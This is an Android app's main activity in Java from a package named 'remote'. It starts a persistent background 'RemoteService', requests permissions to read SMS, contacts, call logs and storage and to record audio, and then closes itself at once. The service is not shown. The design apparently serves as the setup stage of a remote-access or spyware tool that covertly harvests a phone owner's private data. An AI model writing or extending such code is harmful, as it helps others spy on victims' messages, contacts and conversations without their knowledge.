package com.sohaibazmi.remote;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.widget.Toast;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

public class MainActivity extends AppCompatActivity {

    private final String[] permissions = {
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.WRITE_EXTERNAL_STORAGE
    };

    private final int PERM_REQ_CODE = 101;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Start the background service (also done on boot)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(new Intent(this, RemoteService.class));
        }

        if (!hasAllPermissions()) {
            ActivityCompat.requestPermissions(this, permissions, PERM_REQ_CODE);
        } else {
            Toast.makeText(this, "✅ Permissions already granted", Toast.LENGTH_SHORT).show();
            finish(); // close app if already granted
        }
    }

    private boolean hasAllPermissions() {
        for (String perm : permissions) {
            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED)
                return false;
        }
        return true;
    }

    @Override
    public void onRequestPermissionsResult(int requestCode,
                                           @NonNull String[] perms,
                                           @NonNull int[] results) {
        super.onRequestPermissionsResult(requestCode, perms, results);

        if (requestCode == PERM_REQ_CODE) {
            boolean granted = true;
            for (int r : results) {
                if (r != PackageManager.PERMISSION_GRANTED) {
                    granted = false;
                    break;
                }
            }
            if (granted) {
                Toast.makeText(this, "✅ All permissions granted", Toast.LENGTH_SHORT).show();
            } else {
                Toast.makeText(this, "⚠️ Some permissions denied", Toast.LENGTH_LONG).show();
            }
            finish(); // exit either way
        }
    }
}
